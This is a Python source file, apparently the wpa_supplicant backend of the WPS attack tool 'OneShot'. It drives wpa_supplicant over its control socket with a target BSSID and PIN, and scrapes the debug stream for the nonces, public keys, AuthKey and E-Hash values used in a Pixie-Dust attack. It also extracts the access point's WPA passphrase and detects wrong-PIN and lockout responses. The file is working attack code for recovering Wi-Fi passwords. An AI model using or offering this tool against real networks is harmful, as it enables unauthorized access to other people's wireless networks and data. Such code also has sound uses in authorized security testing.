#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""wpa_supplicant backend for OneShot.

The pure-Python native engine (wps_connect.py) drives the chip directly over
nl80211. That works on mac80211 / softMAC and external USB adapters, but on many
internal FullMAC chips — notably Broadcom (`dhd`) on locked-down Android — the
firmware/driver refuses a raw NL80211_CMD_CONNECT issued by a third-party
process (association comes back with status 1). On those, the proven path is the
one the on-device WPS apps use: run a real wpa_supplicant, talk to its control
socket, issue WPS_REG, and read its `-K -d` debug stream.

This module does exactly that, but feeds the collected M1-M3 data to the built-in
pure-Python Pixie-Dust cracker (pixie.py) instead of an external `pixiewps`. So
the only added dependency on this path is the `wpa_supplicant` binary itself.

Requirements (Android): disable system Wi-Fi first so the framework's
wpa_supplicant releases the interface, then run as root (tsu). The binary must be
built with WPS support (CONFIG_WPS=y).
"""
import os
import queue
import socket
import subprocess
import sys
import tempfile
import threading
import time


def _find_binary(explicit=None):
    """Locate a wpa_supplicant binary: explicit path, then PATH, then Android dirs."""
    candidates = []
    if explicit:
        candidates.append(explicit)
    path_dirs = os.environ.get('PATH', '').split(os.pathsep)
    candidates += [os.path.join(d, 'wpa_supplicant') for d in path_dirs if d]
    candidates += ['/system/bin/wpa_supplicant',
                   '/vendor/bin/hw/wpa_supplicant',
                   '/system/xbin/wpa_supplicant']
    for c in candidates:
        if c and os.path.isfile(c) and os.access(c, os.X_OK):
            return c
    return explicit or 'wpa_supplicant'   # last resort: let exec fail with a clear error


def _get_hex(line):
    """Extract the hex payload from a wpa_supplicant hexdump line (no spaces, upper)."""
    return line.split(':', 3)[2].replace(' ', '').upper()


class WpaSupplicantError(Exception):
    pass


class WpaSupplicant:
    """Runs and drives a wpa_supplicant subprocess over its UNIX control socket.

    Use as a context manager:

        with WpaSupplicant(iface, run_dir, verbose=True) as w:
            w.wps_connection(bssid, pin, creds, status, pixiemode=True)

    `creds` and `status` are populated in place (duck-typed: PixiewpsData /
    ConnectionStatus from oneshot.py).
    """

    def __init__(self, interface, run_dir, binary=None, verbose=False):
        self.interface = interface
        self.verbose = verbose
        self.binary = _find_binary(binary)
        os.makedirs(run_dir, exist_ok=True)
        self.ctrl_dir = tempfile.mkdtemp(prefix='wpas-', dir=run_dir)
        self.conf = os.path.join(self.ctrl_dir, 'wpa_supplicant.conf')
        with open(self.conf, 'w') as f:
            f.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.ctrl_dir))
        self.ctrl_path = os.path.join(self.ctrl_dir, interface)
        self.reply_path = os.path.join(self.ctrl_dir, 'oneshot.reply')
        self.proc = None
        self.sock = None
        self._q = None
        self._reader = None

    # -- lifecycle ---------------------------------------------------------
    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *exc):
        self.stop()
        return False

    def start(self):
        cmd = [self.binary, '-K', '-d', '-Dnl80211,wext,hostapd,wired',
               '-i', self.interface, '-c', self.conf]
        if self.verbose:
            print('[*] Running wpa_supplicant: {}'.format(' '.join(cmd)))
        else:
            print('[*] Running wpa_supplicant…')
        try:
            self.proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                bufsize=1, encoding='utf-8', errors='replace')
        except FileNotFoundError:
            raise WpaSupplicantError(
                "wpa_supplicant binary not found ('{}'). Install it or pass "
                "--wpa-supplicant-path.".format(self.binary))
        self._q = queue.Queue()
        self._reader = threading.Thread(target=self._reader_loop, daemon=True)
        self._reader.start()
        # Wait for the control socket to appear (or the process to die).
        deadline = time.time() + 10
        while time.time() < deadline:
            ret = self.proc.poll()
            if ret is not None:
                raise WpaSupplicantError(
                    'wpa_supplicant exited early (code {}). Is Wi-Fi still enabled, or '
                    'another supplicant holding {}?'.format(ret, self.interface))
            if os.path.exists(self.ctrl_path):
                break
            time.sleep(0.1)
        else:
            raise WpaSupplicantError(
                'wpa_supplicant control socket never appeared at {}'.format(self.ctrl_path))
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.sock.bind(self.reply_path)
        self.sock.settimeout(5)

    def stop(self):
        try:
            if self.sock:
                self.sock.close()
        except OSError:
            pass
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.proc.kill()
        # Best-effort cleanup of our run dir.
        for p in (self.reply_path, self.ctrl_path, self.conf):
            try:
                os.remove(p)
            except OSError:
                pass
        try:
            os.rmdir(self.ctrl_dir)
        except OSError:
            pass

    # -- control socket I/O ------------------------------------------------
    def _reader_loop(self):
        try:
            for line in self.proc.stdout:
                self._q.put(line)
        finally:
            self._q.put(None)   # EOF sentinel

    def _send_only(self, command):
        self.sock.sendto(command.encode(), self.ctrl_path)

    def _send_recv(self, command):
        self.sock.sendto(command.encode(), self.ctrl_path)
        try:
            data, _ = self.sock.recvfrom(4096)
        except socket.timeout:
            return ''
        return data.decode('utf-8', errors='replace')

    def _drain(self):
        if not self._q:
            return
        while True:
            try:
                self._q.get_nowait()
            except queue.Empty:
                return

    @staticmethod
    def _explain_not_ok(command, respond):
        if command.startswith(('WPS_REG', 'WPS_PBC')) and respond.strip() == 'UNKNOWN COMMAND':
            return ('[!] This wpa_supplicant is built without WPS support. '
                    'Rebuild/obtain one with CONFIG_WPS=y.')
        return '[!] wpa_supplicant rejected the command — run with -v for the debug log'

    # -- the WPS exchange --------------------------------------------------
    def wps_connection(self, bssid, pin, creds, status, pixiemode=False, timeout=60):
        """Issue WPS_REG and pump wpa_supplicant's debug stream into creds/status.

        Returns True if it ran to a terminal state (data collected / PSK / fail).
        """
        self._drain()
        print("[*] Trying PIN '{}'…".format(pin))
        resp = self._send_recv('WPS_REG {} {}'.format(bssid, pin))
        if 'OK' not in resp:
            status.status = 'WPS_FAIL'
            print(self._explain_not_ok('WPS_REG', resp))
            return False
        deadline = time.time() + timeout
        while True:
            remaining = deadline - time.time()
            if remaining <= 0:
                print('[!] wpa_supplicant timed out waiting for the WPS exchange')
                break
            try:
                line = self._q.get(timeout=remaining)
            except queue.Empty:
                print('[!] wpa_supplicant timed out waiting for the WPS exchange')
                break
            if line is None:
                print('[!] wpa_supplicant exited during the exchange')
                break
            self._handle_line(line.rstrip('\n'), creds, status, pixiemode)
            if pixiemode and creds.got_all():
                break
            if status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break
        self._send_only('WPS_CANCEL')
        return True

    def _handle_line(self, line, creds, status, pixiemode):
        if self.verbose:
            sys.stderr.write(line + '\n')
        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                status.last_m_message = n
                print('[*] Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                status.last_m_message = n
                print('[*] Received WPS Message M{}'.format(n))
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                creds.e_nonce = _get_hex(line)
                if pixiemode:
                    print('[P] E-Nonce: {}'.format(creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                creds.pkr = _get_hex(line)
                if pixiemode:
                    print('[P] PKR: {}'.format(creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                creds.pke = _get_hex(line)
                if pixiemode:
                    print('[P] PKE: {}'.format(creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                creds.authkey = _get_hex(line)
                if pixiemode:
                    print('[P] AuthKey: {}'.format(creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                creds.e_hash1 = _get_hex(line)
                if pixiemode:
                    print('[P] E-Hash1: {}'.format(creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                creds.e_hash2 = _get_hex(line)
                if pixiemode:
                    print('[P] E-Hash2: {}'.format(creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                status.status = 'GOT_PSK'
                status.wpa_psk = bytes.fromhex(_get_hex(line)).decode('utf-8', errors='replace')
        elif 'Trying to associate with' in line:
            status.status = 'associating'
            print('[*] Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            print('[+] Associated')
        elif 'EAPOL: txStart' in line:
            print('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print('[*] Received Identity Request')
        elif 'WPS-FAIL' in line and status.status:
            if 'config_error=15' in line:
                print('[*] WPS-FAIL: AP reports WPS LOCKED')
                if not pixiemode:
                    status.status = 'WPS_FAIL'
            elif 'msg=8' in line:
                status.status = 'WSC_NACK'
                print('[-] Error: wrong PIN')
            else:
                status.status = 'WPS_FAIL'
